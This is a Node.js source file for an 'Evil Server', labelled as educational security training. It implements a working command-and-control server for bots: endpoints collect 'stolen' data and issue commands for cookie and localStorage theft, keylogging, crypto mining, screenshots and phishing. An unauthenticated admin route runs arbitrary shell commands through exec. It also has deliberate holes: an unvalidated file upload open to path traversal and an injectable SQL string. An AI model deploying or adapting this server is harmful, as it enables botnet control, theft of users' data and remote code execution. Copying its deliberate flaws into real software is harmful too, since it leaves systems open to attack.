/**
 * 🚨 EVIL SERVER - Educational Malicious Server
 * WARNING: This is for security training only
 */

const express = require('express');
const WebSocket = require('ws');
const fs = require('fs');
const crypto = require('crypto');

class EvilServer {
    constructor() {
        this.app = express();
        this.wss = null;
        this.clients = new Map();
        this.stolenData = [];
        this.config = {
            port: 6666,
            secretKey: 'EVIL_SERVER_MASTER_KEY_2024',
            dataPath: './stolen_data/',
            logPath: './evil_logs/'
        };
        
        this.setupDirectories();
        this.setupMiddleware();
        this.setupRoutes();
        this.setupWebSocket();
        this.start();
    }
    
    setupDirectories() {
        if (!fs.existsSync(this.config.dataPath)) {
            fs.mkdirSync(this.config.dataPath, { recursive: true });
        }
        if (!fs.existsSync(this.config.logPath)) {
            fs.mkdirSync(this.config.logPath, { recursive: true });
        }
    }
    
    setupMiddleware() {
        // 🚨 Disable security headers
        this.app.disable('x-powered-by');
        
        // 🚨 Allow all CORS
        this.app.use((req, res, next) => {
            res.header('Access-Control-Allow-Origin', '*');
            res.header('Access-Control-Allow-Methods', '*');
            res.header('Access-Control-Allow-Headers', '*');
            next();
        });
        
        // 🚨 Log all requests
        this.app.use((req, res, next) => {
            const log = {
                timestamp: new Date().toISOString(),
                ip: req.ip,
                method: req.method,
                url: req.url,
                userAgent: req.get('user-agent')
            };
            
            this.logRequest(log);
            next();
        });
        
        // 🚨 Parse all data types
        this.app.use(express.json({ limit: '50mb' }));
        this.app.use(express.urlencoded({ extended: true, limit: '50mb' }));
    }
    
    setupRoutes() {
        // 🚨 Data collection endpoint
        this.app.post('/collect', (req, res) => {
            const data = req.body;
            const clientId = req.query.clientId || this.generateClientId();
            
            this.saveStolenData(clientId, data);
            
            // Send success response
            res.json({ 
                status: 'success',
                message: 'Data received',
                nextCommand: this.getNextCommand(clientId)
            });
        });
        
        // 🚨 Command endpoint for bots
        this.app.get('/command/:clientId', (req, res) => {
            const clientId = req.params.clientId;
            const command = this.getCommandForClient(clientId);
            
            res.json({
                command: command,
                timestamp: Date.now()
            });
        });
        
        // 🚨 Report endpoint for bots
        this.app.post('/report/:clientId', (req, res) => {
            const clientId = req.params.clientId;
            const report = req.body;
            
            this.saveReport(clientId, report);
            res.json({ status: 'received' });
        });
        
        // 🚨 Admin panel (NO AUTHENTICATION)
        this.app.get('/admin', (req, res) => {
            const stats = {
                totalClients: this.clients.size,
                totalData: this.stolenData.length,
                activeCommands: this.getActiveCommands(),
                systemInfo: this.getSystemInfo()
            };
            
            res.send(`
                <html>
                <head><title>Evil Server Admin</title></head>
                <body style="background: black; color: lime; font-family: monospace;">
                    <h1>🔓 EVIL SERVER CONTROL PANEL</h1>
                    <h3>Connected Clients: ${stats.totalClients}</h3>
                    <h3>Stolen Data Items: ${stats.totalData}</h3>
                    
                    <h4>Active Commands:</h4>
                    <pre>${JSON.stringify(stats.activeCommands, null, 2)}</pre>
                    
                    <h4>Send Command to All:</h4>
                    <form action="/admin/command" method="POST">
                        <input type="text" name="command" placeholder="Command">
                        <input type="submit" value="Send">
                    </form>
                    
                    <h4>Recent Data:</h4>
                    <pre>${JSON.stringify(this.stolenData.slice(-5), null, 2)}</pre>
                </body>
                </html>
            `);
        });
        
        // 🚨 Command execution (NO INPUT VALIDATION)
        this.app.post('/admin/command', (req, res) => {
            const command = req.body.command;
            
            // 🚨 DANGEROUS: Execute system commands
            const { exec } = require('child_process');
            exec(command, (error, stdout, stderr) => {
                res.send(`
                    <h3>Command Output:</h3>
                    <pre>${stdout}</pre>
                    ${stderr ? `<h3>Error:</h3><pre>${stderr}</pre>` : ''}
                    <a href="/admin">Back</a>
                `);
            });
        });
        
        // 🚨 File upload (NO VALIDATION)
        this.app.post('/upload', (req, res) => {
            const file = req.body.file;
            const filename = req.body.filename || 'uploaded_file';
            
            // 🚨 Save without validation
            fs.writeFileSync(`${this.config.dataPath}${filename}`, file, 'base64');
            res.json({ status: 'uploaded' });
        });
        
        // 🚨 SQL Injection vulnerable endpoint
        this.app.get('/search', (req, res) => {
            const query = req.query.q || '';
            
            // 🚨 Vulnerable SQL query
            const sql = `SELECT * FROM users WHERE name LIKE '%${query}%'`;
            
            // Simulated database
            const fakeResults = [
                { id: 1, name: 'admin', password: 'admin123' },
                { id: 2, name: 'user', password: 'password' }
            ];
            
            res.json({ 
                query: sql,
                results: fakeResults.filter(u => u.name.includes(query))
            });
        });
    }
    
    setupWebSocket() {
        this.wss = new WebSocket.Server({ port: 8080 });
        
        this.wss.on('connection', (ws, req) => {
            const clientId = this.generateClientId();
            const clientInfo = {
                id: clientId,
                ip: req.socket.remoteAddress,
                connectedAt: new Date(),
                lastSeen: new Date()
            };
            
            this.clients.set(clientId, { ws, info: clientInfo });
            
            console.log(`[EVIL] New client connected: ${clientId}`);
            
            // Send welcome command
            ws.send(JSON.stringify({
                type: 'welcome',
                clientId: clientId,
                commands: ['collect_data', 'start_miner', 'keylog']
            }));
            
            ws.on('message', (message) => {
                try {
                    const data = JSON.parse(message);
                    this.handleWebSocketMessage(clientId, data);
                } catch (e) {
                    console.error('[EVIL] Failed to parse message:', e);
                }
            });
            
            ws.on('close', () => {
                console.log(`[EVIL] Client disconnected: ${clientId}`);
                this.clients.delete(clientId);
            });
        });
    }
    
    handleWebSocketMessage(clientId, data) {
        const client = this.clients.get(clientId);
        if (!client) return;
        
        client.info.lastSeen = new Date();
        
        switch (data.type) {
            case 'handshake':
                console.log(`[EVIL] Handshake from ${clientId}`);
                break;
                
            case 'data':
                this.saveStolenData(clientId, data.payload);
                break;
                
            case 'report':
                this.saveReport(clientId, data.payload);
                break;
                
            case 'command_result':
                console.log(`[EVIL] Command result from ${clientId}:`, data.result);
                break;
        }
    }
    
    saveStolenData(clientId, data) {
        const entry = {
            clientId: clientId,
            timestamp: new Date().toISOString(),
            data: data
        };
        
        this.stolenData.push(entry);
        
        // Save to file
        const filename = `${this.config.dataPath}${clientId}_${Date.now()}.json`;
        fs.writeFileSync(filename, JSON.stringify(entry, null, 2));
        
        console.log(`[EVIL] Saved data from ${clientId} to ${filename}`);
    }
    
    saveReport(clientId, report) {
        const filename = `${this.config.logPath}${clientId}_report_${Date.now()}.json`;
        fs.writeFileSync(filename, JSON.stringify({
            clientId: clientId,
            timestamp: new Date().toISOString(),
            report: report
        }, null, 2));
    }
    
    getCommandForClient(clientId) {
        // 🚨 Return malicious command
        const commands = [
            { type: 'collect_data', target: 'cookies' },
            { type: 'collect_data', target: 'localStorage' },
            { type: 'start_miner', intensity: 'high' },
            { type: 'keylog', duration: 3600000 },
            { type: 'screenshot' },
            { type: 'phishing', template: 'login_page' }
        ];
        
        return commands[Math.floor(Math.random() * commands.length)];
    }
    
    getNextCommand(clientId) {
        return this.getCommandForClient(clientId);
    }
    
    getActiveCommands() {
        const commands = [];
        this.clients.forEach((client, id) => {
            commands.push({
                clientId: id,
                lastSeen: client.info.lastSeen
            });
        });
        return commands;
    }
    
    getSystemInfo() {
        return {
            platform: process.platform,
            arch: process.arch,
            nodeVersion: process.version,
            memory: process.memoryUsage(),
            uptime: process.uptime()
        };
    }
    
    logRequest(log) {
        const logFile = `${this.config.logPath}access_${new Date().toISOString().split('T')[0]}.log`;
        fs.appendFileSync(logFile, JSON.stringify(log) + '\n');
    }
    
    generateClientId() {
        return 'bot_' + crypto.randomBytes(4).toString('hex');
    }
    
    start() {
        this.app.listen(this.config.port, () => {
            console.log(`[EVIL] Server running on port ${this.config.port}`);
            console.log(`[EVIL] WebSocket server on port 8080`);
            console.log(`[EVIL] Admin panel: http://localhost:${this.config.port}/admin`);
            console.log(`[EVIL] Data path: ${this.config.dataPath}`);
        });
    }
}

// 🚨 Start server
if (require.main === module) {
    const server = new EvilServer();
    
    // Export for testing
    module.exports = server;
    }
